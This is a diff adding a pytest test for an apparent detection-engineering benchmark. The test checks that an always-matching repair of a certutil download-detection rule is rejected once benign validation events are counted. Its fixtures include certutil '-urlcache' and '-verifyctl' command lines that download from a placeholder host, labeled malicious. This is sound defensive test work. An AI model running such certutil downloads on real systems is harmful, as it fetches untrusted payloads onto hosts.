@@ -130,3 +130,59 @@ def test_variants_are_verified_written_privately_and_repairable(root):
         assert report_b0["outcome"] == "repaired", report_b0.get("reason")
     finally:
         es.close()
+
+
+@pytest.mark.engine
+def test_negative_control_weakened_repair_fails_validation(tmp_path):
+    """Plan section 9: an always-true style repair must fail validation. It catches the missed
+    attack, so it passes development screening, and only the reference negatives (labeled
+    benign) expose it as a false-alarm generator."""
+    from aegisbench.variants import HEALTHY, _jsonl, _mapping_yaml, to_ecs
+    from aegissec.detect.candidate import Candidate
+    from aegissec.detect.fixtures import Event
+    from aegissec.detect.workflow import Inputs, run
+
+    healthy = RULE
+    impaired = RULE.replace("['-urlcache', '-verifyctl']", "'-urlcache'")  # misses -verifyctl downloads
+
+    def ev(eid, label, cmd, image="C:\\Windows\\certutil.exe"):
+        return Event(eid, label, "S1" if label == "malicious" else None, to_ecs({"Image": image, "CommandLine": cmd}))
+
+    dev = [
+        ev("d1", "malicious", "certutil -urlcache -f http://h/a"),
+        ev("d2", "malicious", "certutil -verifyctl -f http://h/b"),
+        ev("d3", "benign", "certutil -dump cert.cer"),
+    ]
+    val = [
+        ev("v1", "malicious", "certutil -verifyctl -f http://h/c"),
+        ev("v2", "benign", "certutil -hashfile x SHA256"),
+        ev("v3", "benign", "certutil -encode a b"),
+    ]
+    (tmp_path / "dev.jsonl").write_text(_jsonl(dev))
+    (tmp_path / "val.jsonl").write_text(_jsonl(val))
+    inputs = Inputs(
+        impaired,
+        _mapping_yaml(HEALTHY),
+        tmp_path / "dev.jsonl",
+        tmp_path / "val.jsonl",
+        healthy,
+        _mapping_yaml(HEALTHY),
+    )
+
+    def weaken(rule, mapping, dataset, hyps, matched):  # "-" matches every certutil command line
+        spec = {"field": "CommandLine", "modifier": "contains", "values": ["-"]}
+        patch = {"kind": "set_predicate", "selection": "selection", "field": "CommandLine", "predicate": spec}
+        return [
+            Candidate.model_validate(
+                {"proposal_id": "weaken", "original_sha256": rule.sha256, "patch_kind": "rule", "patch": [patch]}
+            )
+        ]
+
+    es = Elasticsearch(ES_URL)
+    try:
+        report = run(inputs, es, generator=weaken)
+    finally:
+        es.close()
+    assert report["outcome"] == "abstained", report.get("reason")
+    assert "benign_matches_above_baseline" in report["reason"]
+    assert report["candidates"][0]["candidate"]["proposal_id"] == "weaken"  # it did pass screening
